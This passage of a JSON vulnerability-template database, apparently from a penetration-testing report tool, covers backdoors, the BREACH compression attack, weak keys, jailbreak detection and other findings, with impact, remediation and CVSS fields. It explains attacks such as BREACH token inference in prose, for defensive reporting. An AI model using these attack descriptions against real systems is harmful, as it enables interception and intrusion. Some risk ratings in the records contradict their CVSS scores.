deployed. Conversely, a malicious developer may introduce a backdoor to gain unauthorized access to the application once it is pushed to production.\nBackdoors manifest in code in many ways. Some examples include (but are not limited to):\n--Hardcoded credentials either in the code itself or in a default deployment's configuration or database\n--Hidden parameters that alter application behavior (e.g. HTTP request parameters that affect program execution depending on their value or presence)\n--Use of dangerous APIs to obscure backdoors themselves (e.g. Base64 decode functions used to decode Base64-encoded code or credentials)\n\n","poc":null,"impact":"An attacker who discovers and exploits a backdoor will gain unauthorized access to any data and functionality made available via the authentication bypass. The consequence of exploit depends on the type of backdoor discovered and the level of access it provides. Some commercial applications, for example, are set with default credentials that provide administrator-level access to configure the application and manage users. Test credentials and other authentication bypass mechanisms used for debug purposes may also provide administrator-level access. In general, sensitive data may be exposed, and application data may be modified or deleted, leading to a loss of confidentiality and data integrity.\n","remediation":"All code that allows authentication bypass should be removed from the application before it is deployed in production, and the use of dangerous APIs should be restricted or avoided where possible.\n","cvss_base_score":7.5,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:S/C:C/I:P/A:P)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:17","updated_at":"2018-11-12 09:25:17","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":668,"plugin_id":null,"title":"Re-authentication Not Required for Sensitive Transactions","type":null,"description":"Users are not required to re-authenticate when performing sensitive transactions. Sensitive transactions often include those that affect a user's account (e.g. authenticated password reset, money transfers, etc.) or affect the application at large (e.g. application configuration changes and operations that consume a significant amount of resources). Though the application may verify a user's identity and set of entitlements initially at login, trusting this initial one-time authentication does not protect against certain attacks.\n","poc":null,"impact":"An attacker may be able to execute sensitive transactions by exploiting unrelated vulnerabilities in an application, such as cross-site request forgery, session hijacking or cross-site scripting, without needing the user's current credentials. Depending on what functionality is exposed, an attacker may then impersonate victims in the applications, execute denial of service attacks, expose sensitive information, etc. For example, if the application does not require a user's current password during an authenticated password reset, an attacker who gains access to a victim's session (through session hijacking, physical system access, etc.) can reset the victim's password. This serves two purposes; the attacker is able to continue to impersonate the victim, while preventing the victim from authenticating to the application.\n","remediation":"The application should require users to enter their current password before performing sensitive transactions. In all cases, authentication and re-authentication verification should be performed server-side to avoid authentication bypass attacks.\n","cvss_base_score":7.5,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:S/C:C/I:P/A:P)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:17","updated_at":"2018-11-12 09:25:17","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":669,"plugin_id":null,"title":"Insufficient Schema Validation","type":null,"description":"The application does not validate untrusted XML input against a schema. Many applications, such as web services, depend on XML messages for communication between application components. A DTD or XML schema is used to ensure that XML messages are within well-defined limits and contain only allowed entities. For example, consider a Java application that uses the DocumentBuilderFactory class to configure XML parsing agents. By default, both DTD and schema validation are disabled.\n","poc":null,"impact":"An attacker may be able to supply XML input tailored to launch a variety of attacks. Malicious data may target the parser directly, resulting in a denial of service condition. Other consequences are application-specific and depend on what the data in question is used for in downstream processing. Common results of parsing XML documents that contain untrusted data include, but are not limited to: injection attacks such as SQL injection or command injection, privilege escalation attacks, and confused deputy attacks.\n","remediation":"The application should implement schema validation before parsing any external XML input. In the case of the DocumentBuilderFactory class, this includes setting the setValidating() configuration to true for DTD validation and specifying a schema to validate input against using the setSchema() function.\n","cvss_base_score":7.8,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:N/C:N/I:P/A:C)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:17","updated_at":"2018-11-12 09:25:17","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":670,"plugin_id":null,"title":"Insufficient Key Size","type":null,"description":"The application encrypts data using encryption keys of insufficient length. This facilitates brute force attacks, in which every possible key from the key space is enumerated and tested on a given ciphertext. As computing power and algorithms improve, these attacks become quicker. Given this fact, provided that there are no weaknesses in the encryption algorithm itself, the length of the encryption key sets an upper bound for the relative strength for the algorithm.\n","poc":null,"impact":"Encryption keys of insufficient size reduce the complexity, and therefore strength, of encryption algorithms. A knowledgeable attacker that obtains a copy of a ciphertext can attempt a brute force attack to decrypt it and obtain the original text. Depending on the nature of the exposed data, this can result in a complete breach of data confidentiality and integrity.\n","remediation":"Keys should be generated in such a way that it would be infeasible given current and near-term forecasted computing power to brute force all keys in the key space. As of July 2016, 256-bit keys are recommended for AES (symmetric), and 2048-bit or larger keys are recommended for RSA (asymmetric). Due to the always increasing computational power available, these key lengths should be updated periodically.\n","cvss_base_score":7.8,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:N/C:C/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:17","updated_at":"2018-11-12 09:25:17","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":671,"plugin_id":null,"title":"Apache Tomcat Vulnerable Version in Use","type":null,"description":"The remote server is running a version of Apache Tomcat (often referred to simply as \"Tomcat\") which contains known vulnerabilities. Apache Tomcat is an open-source web server that allows users to serve applications written using Java Servlets, JavaServer Pages (JSP), Java EL, and Java WebSocket.\n","poc":null,"impact":"In general, published vulnerabilities have a greater likelihood of exploitation by attackers due to readily available proof-of-concept code that exploits the issue, or integrates the exploits into freely available testing tools. The vulnerabilities present in Tomcat (and subsequently the impact of exploit) depend on the version currently deployed. Certain versions of Tomcat are vulnerable to denial of service attacks that prevent legitimate users from accessing resources hosted on the affected server. Other vulnerabilities may allow an attacker to read source files from the web server, hijack victims' sessions in hosted applications, and leak sensitive information about the server, among others.\nFor the latest list of CVE's open against Tomcat, select the deployed version of Tomcat from the version list on the following page:  http://www.cvedetails.com/version-list/45/887/1/Apache-Tomcat.html\n","remediation":"Upgrade to the latest version of Apache Tomcat. Organizations should also use a patch management system to keep software up to date without disrupting ongoing business. There are a number of commercial patch management systems such as Microsoft Windows Server Update Services (WSUS), Kaseya Patch Management, and Patch Manager from Solarwinds, that organizations may choose to employ for this purpose.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:17","updated_at":"2018-11-12 09:25:17","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":672,"plugin_id":null,"title":"HTTP Compression BREACH Information Leakage","type":null,"description":"The HTTP server is vulnerable to the BREACH (\"Browser Reconnaissance and Exfiltration via Adaptive Compression of Hypertext\") information leakage attack. The BREACH attack exploits a common bandwidth-saving technique known as HTTP compression, wherein a server uses algorithms such as GZIP or DEFLATE to compress HTTP responses prior to transmission. BREACH is closely related to the CRIME (\"Compression Ratio Info-leak Made Easy\") attack, which exploits SSL/TLS compression.\nIf an attacker can repeatedly inject presumed copies of sensitive data into the body of a request, an inference about the sensitive data can be made based on the resulting compressed size of the HTTP body. The attack is most effective against per-session Cross-Site Request Forgery (CSRF) tokens but it also applies to any other personal or secret information that is reflected in the response body. A man-in-the-middle (MiTM) attacker must be able to:\n--Observe the victim's network traffic\n--Cause the victim's browser to submit requests to the target site (e.g. when the victim visits an attacker-controlled page)\n\nOnce these requirements are met, the attack scenario may begin. For example, suppose that the server inserts a secret per-session CSRF token into every HTTP response:\n<pre>csrfToken=dbhd9afb01046b3h39attr3t143nv </pre>\nWithin the user's browser, an attacker can craft JavaScript code that sends the following HTTP request:\n<pre>csrfToken=a </pre>\nHTTP compression will reduce the twice repeated \"csrfToken=a\" sequences. A MiTM attacker will not be able to see the CSRF token; however, they will be able to observe the length of the encrypted traffic. An attacker will then send a similar request, this time with \"csrfToken=b\", then with \"csrfToken=c\", and so on. Each of these requests will compress to the same size. Once a request with \"csrfToken=d\" is sent, the compressed text will be shorter since the repeated sequence is now 11 bytes instead of 10. Observing this change, an attacker can infer that the first byte of the CSRF cookie is \"d\". This iterative process can then be repeated until the full token is recovered. This attack typically takes less than one minute. More information on BREACH can be found on this page:\nhttps://blog.qualys.com/ssllabs/2013/08/07/defending-against-the-breach-attack\n","poc":null,"impact":"A successful attack results in a leakage of sensitive information. Attackers can use BREACH to identify personal information, CSRF tokens, or other sensitive data even when the server uses SSL/TLS encryption. All versions of SSL/TLS and all cipher suites are affected.\n","remediation":"The server should be configured to disable HTTP compression when the Referer header does not match the server's domain name. This technique prevents the attacker from exploiting HTTP compression but applies bandwidth-saving compression once the user has loaded the application. For the Apache web server, the following directives apply this technique:\n<pre>SetOutputFilter DEFLATE BrowserMatch ^Mozilla/4 gzip-only-text/html BrowserMatch ^Mozilla/4\\.0[678] no-gzip BrowserMatch \\bMSIE !no-gzip !gzip-only-text/html SetEnvIfNoCase Request_URI \\.(?:gif|jpe?g|png|zip|gz|tgz|htc)$ no-gzip dont-vary SetEnvIfNoCase Referer .* self_referer=no SetEnvIfNoCase Referer ^https://www\\.example\\.com/ self_referer=yes SetEnvIf self_referer ^no$ no-gzip Header append Vary User-Agent env=!dont-vary </pre>\nWhere \"example.com\" should be replaced with the server's domain name. These directives also disable compression for older and unsupported versions of Firefox and Internet Explorer that do not handle HTTP compression correctly. See https://httpd.apache.org/docs/2.4/mod/mod_deflate.html and https://svn.apache.org/repos/asf/httpd/httpd/tags/2.2.9/docs/manual/mod/mod_deflate.html.en for more information on these directives.\n","cvss_base_score":6.4,"cvss_temporal_score":5,"cvss_vector":"(AV:N/AC:L/Au:N/C:P/I:P/A:N/E:POC/RL:OF/RC:C)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:17","updated_at":"2018-11-12 09:25:17","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":673,"plugin_id":null,"title":"X.509 Certificate Chain Contains RSA Keys Less Than 2048 Bits (SSL/TLS)","type":null,"description":"The X.509 certificate uses RSA with a key shorter than 2048 bits as its encryption and digital signature algorithm. The use of a key that is less than 2048 bits significantly reduces the strength of the algorithm, leaving it vulnerable to known cryptographic attacks. Note that automated tools, such as \"SSL Cert Checker\" by Symantec, can be used to quickly detect if the X.509 certificates in use by the target application use a key size of less than 2048 bits.\n","poc":null,"impact":"An attacker may be able to duplicate certificates that use RSA with a key length shorter than 2048 bits. Keys shorter than 2048 bits are vulnerable to compromise through brute forcing attacks, which can be run by an attacker that has access to the necessary computing power. Once a certificate is compromised an attacker will be able to issue modified certificates and leverage them to perform fraudulent activities, such as phishing attacks, man-in-the-middle attacks, and content spoofing.\n","remediation":"All certificates issued that use RSA must use a key that is at least 2048 bits long, and all certificates that use keys under that length must be decommissioned. The requirement for 2048 bits keys has also been incorporated into the \"New Standard for X.509 Certificates\" published by the Certification Authority / Browser (CA/B) forum. This standard requires that certificates issued after January 1st, 2014 must use a minimum key size of 2048 bits, and that existing certificates should be re-enrolled with the greater key size setting if they currently do not meet the requirement.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:17","updated_at":"2018-11-12 09:25:17","approved":1,"v_likelihood":"Low","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":674,"plugin_id":null,"title":"Weak Input Validation","type":null,"description":"The application stores or processes untrusted data that has not been sufficiently validated. This may be due to a complete lack of validation or validation filters whose implementation does not provide sufficient protection for the given input. An application may obtain data from various external and internal sources including databases, file servers, web services, external client requests, etc. While some of these sources may be considered trustworthy, no assumptions should be made about the validity of data whose source cannot be explicitly verified. This includes not only external data, but also data that was previously stored by the same application and data generated by other entities in the same organization.\n","poc":null,"impact":"Failure to properly validate and handle untrusted input represents the single largest category of software security weaknesses. At a minimum, data that is not validated may impact the application's control flow or data flow, leading to unexpected application states for end users, unintended changes to back-end data, as well as unexpected outcomes from executed application logic.\nAn attacker may submit payloads that seek to exploit any number of vulnerabilities that typically result from a lack of input validation. These include (but are not limited to) SQL injection, cross-site scripting, LDAP injection, log injection, and command injection. The consequence of successfully exploiting these vulnerabilities varies, but most provide an attacker with the ability to bypass authentication and/or authorization mechanisms to access, modify or delete application and user data, or execute functionality only available to legitimate users.\n","remediation":"Data that does not match an expected pattern and data that could potentially be used to execute injection attacks must be discarded or sanitized before use. Before validation is performed, inputs must be normalized to a standard encoding format. Validation should then be performed in such a way that end-users cannot tamper with or bypass the control. For example, in client/server applications (e.g. web applications, mobile applications and thick clients that make service calls over a network, etc.), validation should be performed server-side rather than client-side.\nWhitelist validation should be favored first over other validation techniques since any character or string not explicitly specified as part of the \"known-safe\" set of characters or values is rejected or removed by default. If a sufficient whitelist pattern cannot be determined, blacklist validation can be implemented to provide some protection by filtering out or rejecting inputs that contain specified characters.\nIn some cases, characters considered dangerous if handled by the application in certain ways may be part of an input's expected format. Separate security controls will need to be implemented in such cases to protect against certain attacks. Consider the following examples:\n--Application users may have a legitimate need to include characters that, in certain combinations, can be interpreted as HTML and JavaScript code by an end-user's browser. In this situation, these characters cannot be filtered; instead, the application must encode these characters for the appropriate output context.\n--The application may allow users to include single-quotes in a name field, but single-quotes may affect how SQL queries are executed if the input is concatenated to a static query string. In this case, correctly utilizing parameterized queries sufficiently protects against SQL injection attacks.\n\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:17","updated_at":"2018-11-12 09:25:17","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":675,"plugin_id":null,"title":"Apple GOTOFail","type":null,"description":"The application is vulnerable to the Apple GOTOFail vulnerability. A flaw exists within the iOS platform's TLS/SSL handling on firmware versions less than 7.0.6. This impacts the application's network communications confidentiality and/or integrity.  When the application attempts to establish a secure connection, using Apple's Networking APIs, it does so in a manner that allows a suitably positioned attacker to intercept the TLS/SSL handshake and eavesdrop on the communications between client and server.\n","poc":null,"impact":"A \"man-in-the-middle\" attack will allow an attacker to view and tamper with the data passed between the client and server. Depending on the sensitivity of the data exposed, an attacker can gain access to personally identifiable information (PII) and any other sensitive data handled by the application. An attacker may also be able to modify application requests and responses, leading to unexpected application behavior as well as unauthorized access to application functionality.\n","remediation":"The application's minimum iOS version should be set to at least \"7.0.6.\"  This is an application project or target setting in XCode; the minimum version gets placed in the application's \"Info.plist.\"\n","cvss_base_score":3.6,"cvss_temporal_score":2.6,"cvss_vector":"(AV:N/AC:H/Au:S/C:P/I:P/A:N/E:U/RL:OF/RC:C)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:17","updated_at":"2018-11-12 09:25:17","approved":1,"v_likelihood":"Minimal","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":676,"plugin_id":null,"title":"Vulnerable Third-Party Libraries in Use","type":null,"description":"The application leverages third-party libraries that contain known vulnerabilities. In general, published vulnerabilities have a greater likelihood of exploitation by attackers due to readily available proof-of-concept code that exploits the issue, or integrates the exploits into freely available testing tools.\n","poc":null,"impact":"Applications inherit the vulnerabilities present in any third-party libraries they utilize. The exact consequence of exploit depends on the application's purpose, the specific third-party library, and the vulnerability present.\n","remediation":"Update any third-party libraries used by the application to the most current version, or apply the latest available patches. If an upgrade is not immediately available, preventative measures should be taken to mitigate the vulnerability as soon as it is identified, until a fix is released. If the third-party library is no longer maintained, a suitable alternative should be implemented or installed and the vulnerable library should be removed from the code base.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:18","updated_at":"2018-11-12 09:25:18","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":677,"plugin_id":null,"title":"Hidden Directory Detected","type":null,"description":"The hidden directory enumeration issue exists when the server responds with a '403 Forbidden' error while trying to access a valid application directory. Hidden directories were detected by viewing the '403 Forbidden' response from the server. An attacker will try to access multiple directories within the application by guessing their names or launching a brute force attack. The server will typically respond with a '404 Not Found' error if a directory does not exist, however if a valid directory exists, the server responds with '403 Forbidden' error. The attacker can use this difference in the response to enumerate the application directories and file structure.\n","poc":null,"impact":"The presence of hidden directories allows an attacker to gather information regarding the file and directory structure of the application by viewing the '403 Forbidden' server response. An attacker can list the server directories by studying the different error responses that are thrown by the application server. This information can result in mapping of the subdirectories, files, and subsequently the entire application directory structure. It may also help the attacker identify the technology stack used in the application by studying the presence or absence of technology-specific server directories.\n","remediation":"The application server should return a '404 Not Found' error response instead of a '403 Forbidden' error response and remove any directories which are not required. The application should respond with a '404 Not Found' error instead of a '403 Forbidden' error when a request is made for existing or a non-existing directory. This will help in obfuscating the valid directories which exist on the server. Additionally, unused files and directories should be removed from the application server.\n","cvss_base_score":2.6,"cvss_temporal_score":2.1,"cvss_vector":"(AV:N/AC:H/Au:N/C:P/I:N/A:N/E:F/RL:OF/RC:C)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:18","updated_at":"2018-11-12 09:25:18","approved":1,"v_likelihood":"High","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":678,"plugin_id":null,"title":"Application not Disabling Custom Keyboards (iOS)","type":null,"description":"The application is not configured to prevent the use of custom keyboards. Custom keyboards became available to iOS users as of iOS version 8.0, allowing users to replace the system keyboard with third party keyboards offering additional or alternative functionality. By default, iOS allows custom keyboards to be used while entering text into applications. By design, custom keyboards have access to both the user's keystrokes and the data that is passed to the active input field. Applications can opt to only allow entering text via the official Apple keyboard application.\n","poc":null,"impact":"Custom keyboards may be able to log and transmit a victim's key presses via network access to a remote system. The following conditions must be met for such an attack to succeed:\n--The malicious keyboard must be available to install. Users typically obtain iOS Software from the iOS AppStore, which would require the malicious keyboard to pass Apple's review process. A user can also install from other sources, though in this case, users must manually trust the software from the developer. Additionally, on jailbroken devices, users can download applications (including custom keyboards) from third-party app stores that often do not have extensive review processes like Apple's AppStore.\n--The user must download, install and use the malicious keyboard while using the application.\n--The user must grant the keyboard \"Full Access\", allowing network access (which is not enabled by default).\n\nNote: on iOS, \"secure\" UI fields such as password fields are automatically protected against this attack since the system keyboard is automatically used in place of any user-installed keyboard. In this case, the user's password is safe from theft; however, the username and other information may be stolen by a malicious custom keyboard.\n","remediation":"High risk applications should be configured to explicitly prevent the use of custom keyboards. Preventing the use of custom keyboards is accomplished by returning \"No\" from the appropriate Application Delegate API method, as shown below for Swift: <pre><code class=\"\">func application(application: UIApplication,         shouldAllowExtensionPointIdentifier extensionPointIdentifier: String) -> Bool {     if (extensionPointIdentifier == UIApplicationKeyboardExtensionPointIdentifier)     {         return false;     }     return true; } </pre>\n\nIf the user should be provided with a choice, then instead of returning \"No\" in the Application Delegate method, the application should return \"Yes\" or \"No\" based on the user's application preferences instead of a system-wide configuration. The user should be warned about the risks of using a custom keyboard when they try to enable custom keyboards in the application preferences.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:18","updated_at":"2018-11-12 09:25:18","approved":1,"v_likelihood":"Minimal","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":679,"plugin_id":null,"title":"Lack of Anti-Debugging Protection (iOS)","type":null,"description":"The application does not attempt to prevent debuggers from attaching to it. The iOS platform contains operating system / kernel level controls to ensure debuggers do not attach to distribution builds of applications. These controls can, however, be bypassed on jailbroken devices.\n","poc":null,"impact":"Allowing a debugger to attach to a process (application) makes a number of attacks possible, including:\n--Bypassing security controls such as authentication, authorization, and device integrity checks by invoking arbitrary methods in the application, invoking methods out of order, changing values in registers or in memory, etc.\n--Reading sensitive data in the application's process memory.\n--Injecting code into the application's process, which can be completely new code and/or code to replace existing method implementations. Attacker-controlled code can perform arbitrary actions within the context of the target application such as reading/writing files inside the application sandbox, intercepting network communications to/from the application, etc.\n\n","remediation":"Anti-debug techniques can always be bypassed due to the jailbroken platform permitting debugging. However, layers of anti-debug controls, especially when combined with other binary hardening techniques such as control flow obfuscation and tamper detection, can make an attacker's job more difficult. Anti-debug controls can help protect the application during execution of sensitive code (e.g. while handling sensitive cryptographic keys) to prevent sensitive data in memory/registers from being easily read or modified by an attacker using a debugger. If these controls are desirable, then a commercial solution that provides anti-debug protections should be utilized (e.g. Arxan, EnsureIT).\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:18","updated_at":"2018-11-12 09:25:18","approved":1,"v_likelihood":"Low","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":680,"plugin_id":null,"title":"No Jailbreak Detection (iOS)","type":null,"description":"The application does not perform any jailbreak detection. Ensuring the integrity of mobile devices is a critical part of enforcing security controls in an application. An application running on a modified/jailbroken device cannot rely on security controls that are normally provided by the platform. For example, anything stored in the application's sandbox can be read by other applications, and all inputs into / outputs from API calls (e.g. for TouchID authentication) can be read and tampered with.\nObjective-C and C, and more recently Swift, are the primary language platforms for developing apps for iOS. Each language platform has particular characteristics that make reverse engineering and bypassing controls more or less difficult. Jailbreak detection performed using only Objective-C APIs is extremely easy to reverse engineer and bypass. Jailbreak detection performed using C and Swift APIs is more challenging to bypass, though with freely available frameworks (e.g. CydiaSubstrate), a moderately skilled attacker may be able to bypass it. Applications can also call the Operating System's Kernel directly to obtain information instead of using user-mode APIs that can be easily hooked. This is done using System Calls. At the current time, there are no publicly available frameworks to allow attackers to hook SVC (System) calls. Typically, when SVC calls are used directly to perform an operation, attackers are forced to modify the application binary if they want to modify that operation's behavior. Making binary modifications requires a level of knowledge in ARM Assembly language and iOS Application signing. Using System calls to obtain information about the device is more reliable as it requires an attacker with a much higher skill level to be able to tamper with the information.\n","poc":null,"impact":"Jailbroken devices allow an attacker to gain full control over the application. This makes a number of attacks possible, including:\n--Bypassing security controls such as authentication, authorization, and device integrity checks by invoking arbitrary methods in the application, invoking methods out of order, or replacing the implementations of functions.\n--Reading sensitive data in the application's process memory.\n--Injecting code into the application's process. Attacker-controlled code can perform arbitrary actions within the context of the target application such as reading/writing files inside the application sandbox, intercepting network communications to/from the application, etc.\n\n","remediation":"Apple does not provide an API for detecting Jailbroken devices, so each application must create its own proprietary solution. Care should be taken to layer in jailbreak detection with binary hardening controls in order to make it more challenging for an attacker to reverse engineer the jailbreak detection mechanisms. Otherwise, attackers who reverse engineer the jailbreak detection mechanisms will be able to implement a \"bypass,\" which can \"trick\" a solution into thinking that a jailbroken device is actually not jailbroken.\nWhen considering a jailbreak detection solution, a \"multi-level set of controls\" solution should be implemented that includes binary hardening controls such as control flow obfuscation, anti-debug controls and anti-tamper controls. With a \"multi-level set of controls\" solution, an attacker must circumvent multiple controls to accomplish the goal. Placing these controls in a specific order increases the required complexity of a successful attack. An attacker may attempt to patch out a jailbreak detection mechanism; however, an anti-tamper control may then prevent the application from running. The attacker may need to attach a debugger to understand how the anti-tamper mechanism works; however, an anti-debug control may then make the application crash. The attacker may attempt to statically analyze the binary to understand the anti-debug control; however, obfuscation might make that difficult.\nAttackers can easily use Reverse Engineering techniques to determine the jailbreak detection controls implemented by an application. Therefore, for areas of code that implement sensitive functionality like this, the application should utilize obfuscation to make it harder for the attacker to reverse engineer it. There are many open source and commercial products available to make obfuscating native code easier for iOS. Additionally, C obfuscators are more mature than obfuscators for Objective-C. So, extremely sensitive operations such as cryptography, jailbreak detection, and certificate pinning should ideally be written in C and obfuscated.\nIt should be noted that jailbreak detection bypass will always be a possible if the attacker has enough time and resources. It is a matter of raising the bar, to deter would-be attackers.\nWith that in mind, the goal should be to make it as difficult as possible to reduce the risk to an acceptable level for the business.\nSome examples of security controls and implementation characteristics for performing jailbreak detection are:\n--Verify the existence of and/or attributes of files and directories only present on jailbroken devices. Examples of files and directories to examine include Cydia related files (e.g. /Applications/Cydia.app), Mobile Substrate related files (e.g. /Library/MobileSubstrate/MobileSubstrate.dylib), Additional system binaries (e.g. /bin/bash, /usr/bin/ssh), and additional system directories (e.g. /etc/apt, /Library/MobileSubstrate)\n--Instead of using standard library APIs, utilize inline assembly to call the associated system call via supervisor intructions (SVC). The system calls (e.g. open, read, link, etc.) can be used in the same way the respective standard library APIs would - to check for the presence of certain filesystem entities. This technique is harder to hook and bypass than standard library usage.\n--Determine whether only the expected libraries are loaded in the application address space. A whitelist approach can be used, but care needs to be taken to avoid false positives. For example, when accessibility mode is in use, certain additional libraries will be present in memory. Additionally, future iOS updates may introduce additional runtime libraries. Ensure libraries such as MobileSubstrate.dylib and libcycript.dylib do not exist in memory.\n--Determine if key functions have been replaced (swizzled). One such technique to do so is to look up Objective-C classes using objc_lookUpClass() and obtain its methods using class_copyMethodList. The application can then iterate through each function, and determine whether the implementation exists within the expected library or application image (using dladdr()).\n--Determine the ability for the device to process specific URL Schemes (limited with iOS 9+). Utilize the canOpenURL API to determine if Cydia is installed, using the Cydia URL scheme: cydia://package/com.example.package\n--Detect binary signature issues. Obtain the application's code signing signature, and verify that the application has not been re-signed.\n--Obfuscate any strings used during detection (such as filenames sent to stat(), open() methods). Strings should be decrypted at the time of use, not at application load. Plaintext strings should be removed from memory after use.\n--Use inline C functions to do detection logic (Do not have an Objective C or even C function that returns a Boolean result as this is easy to bypass)\n--Perform logic to determine the existence of Environment Variables and possibly the loaded library list and look for specific library injection type values. Examples include utilizing getenv() to check for the presence of Mobile Substrate related environment variables.\n--Perform logic to determine if functions are hooked using dlsym. For example, the dlsym() API can be used to verify that a particular symbol exists within a library, and to obtain it's address. This is useful to detect library preload style attacks, whereby replacement function implementations are included in pre-loaded libraries.\n--De-couple detection and reaction as completely as possible, so that attackers can't easily determine the cause of application failure/shutdown.\n--Distribute detection mechanisms throughout the application, and utilize in-lining to ensure that there's no single point of failure.\n--Utilize code obfuscation to increase the complexity of reverse engineering the application.\n--Enforce an MDM detection and monitor for anomalies (if MDM is used).\n--Send encrypted (preferably) or encoded (make it difficult to detect) detection state results back to the server-side and enforce server-side checks of the values in addition to client side controls.\n--Utilize the __RESTRICT header to make code injection more challenging (compiler flags:  -Wl,-sectcreate,__RESTRICT,__restrict,/dev/null ). App Store applications have been observed to utilize this technique, however it's unclear what Apple's stance on this is. Contact Apple prior to App Store submission or anticipate potential pushback during review.\n\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:18","updated_at":"2018-11-12 09:25:18","approved":1,"v_likelihood":"Low","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":681,"plugin_id":null,"title":"Null Initialization Vector Used (iOS)","type":null,"description":"The application passes a NULL initialization vector (IV) to the Common Crypto library for an encryption operation. When the Common Crypto library receives a NULL initialization vector, it uses a default constant initialization vector consisting of all zeroes.\nA valid initialization vector is a unique, random value of length equal to the block size of a block cipher. Initialization vectors are used to vary the output of an encryption function so that, assuming the encryption key remains the same, encrypting the same plaintext multiple times never produces the same ciphertext. A new initialization vector must be generated each time an encryption operation is performed. Using a constant initialization vector eliminates its effectiveness, since the encrypted form of a piece of plaintext will be the same when the same key and initialization vector are used.\n","poc":null,"impact":"An attacker who sees data encrypted using a static initialization vector may be able to detect patterns in the underlying plaintext that leak information about the encrypted data. If the same block of ciphertext appears several times, the observer can reasonably assume that the corresponding plaintext blocks are the same (a \"chosen ciphertext\" attack).\nIf an attacker knows the plaintext blocks corresponding to some ciphertext blocks (by choosing the plaintext and observing the ciphertext), he or she knows the plaintext whenever those ciphertext blocks appear, and can attempt to deduce the remaining parts of the message. In addition, if an attacker can intercept encrypted messages, he or she can tamper with data using chosen known blocks of ciphertext (a type of \"chosen plaintext\" attack).\n","remediation":"A unique, cryptographically secure random value should be generated for use as the initialization vector in each cryptographic operation. It is not important for initialization vectors to be kept secret, so they may be stored or transmitted in the clear with the ciphertext. It is important, however, that a given initialization vector never be reused when encrypting data using the same encryption key.\nIf data integrity is important, then append an HMAC of the ciphertext (including the initialization vector) to the ciphertext that can be verified by the recipient.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:18","updated_at":"2018-11-12 